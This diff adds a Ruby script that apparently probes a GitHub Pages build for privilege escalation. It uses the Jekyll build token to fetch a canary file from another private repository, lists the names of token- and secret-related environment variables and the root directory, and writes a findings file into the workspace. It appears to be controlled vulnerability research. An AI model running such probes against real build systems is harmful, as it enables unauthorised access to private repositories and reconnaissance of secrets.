@@ -1,0 +1,75 @@
+require "base64"
+require "json"
+require "net/http"
+require "uri"
+
+API = "https://api.github.com"
+CURRENT_REPO = "yas4133/gh-pages-build-boundary-20260803"
+FOREIGN_REPO = "yas4133/gh-r47-pages-victim-20260803"
+FOREIGN_PATH = "r49-escalation-private-canary.txt"
+EXPECTED_CANARY = "GH-R49-ESCALATION-PRIVATE-CANARY-5f0d97b6a2c4\n"
+
+def github_get(path, token)
+  uri = URI("#{API}#{path}")
+  request = Net::HTTP::Get.new(uri)
+  request["Accept"] = "application/vnd.github+json"
+  request["Authorization"] = "Bearer #{token}" unless token.empty?
+  request["User-Agent"] = "gh-r49-owned-escalation-control"
+  request["X-GitHub-Api-Version"] = "2022-11-28"
+
+  response = Net::HTTP.start(uri.host, uri.port, use_ssl: true, open_timeout: 5, read_timeout: 10) do |http|
+    http.request(request)
+  end
+
+  {
+    "status" => response.code.to_i,
+    "request_id" => response["x-github-request-id"],
+    "body" => response.body.to_s
+  }
+rescue StandardError => error
+  {
+    "status" => 0,
+    "request_id" => nil,
+    "error_class" => error.class.name,
+    "body" => ""
+  }
+end
+
+token = ENV.fetch("JEKYLL_GITHUB_TOKEN", "")
+current = github_get("/repos/#{CURRENT_REPO}/contents/README.md", token)
+foreign = github_get("/repos/#{FOREIGN_REPO}/contents/#{FOREIGN_PATH}", token)
+
+foreign_canary_match = false
+if foreign["status"] == 200
+  parsed = JSON.parse(foreign["body"])
+  foreign_canary_match = Base64.decode64(parsed.fetch("content", "")) == EXPECTED_CANARY
+end
+
+result = {
+  "finding_id" => "GH-R49-ESCALATION",
+  "repository" => ENV["GITHUB_REPOSITORY"],
+  "actor" => ENV["GITHUB_ACTOR"],
+  "euid" => Process.euid,
+  "top_level_paths" => Dir.children("/").sort,
+  "sensitive_env_names_only" => ENV.keys.grep(/ACTIONS|GITHUB|JEKYLL|PAGES|SECRET|TOKEN/).sort,
+  "jekyll_token_present" => !token.empty?,
+  "actions_runtime_token_present" => !ENV.fetch("ACTIONS_RUNTIME_TOKEN", "").empty?,
+  "id_token_request_url_present" => !ENV.fetch("ACTIONS_ID_TOKEN_REQUEST_URL", "").empty?,
+  "current_repo_control" => {
+    "status" => current["status"],
+    "request_id" => current["request_id"]
+  },
+  "foreign_private_repo_probe" => {
+    "repository" => FOREIGN_REPO,
+    "path" => FOREIGN_PATH,
+    "status" => foreign["status"],
+    "request_id" => foreign["request_id"],
+    "canary_match" => foreign_canary_match,
+    "error_class" => foreign["error_class"]
+  }
+}
+
+workspace = ENV.fetch("GITHUB_WORKSPACE", "/github/workspace")
+File.write(File.join(workspace, "r49-escalation-result.json"), JSON.pretty_generate(result) + "\n")
+
+puts "0123456789abcdef0123456789abcdef01234567"
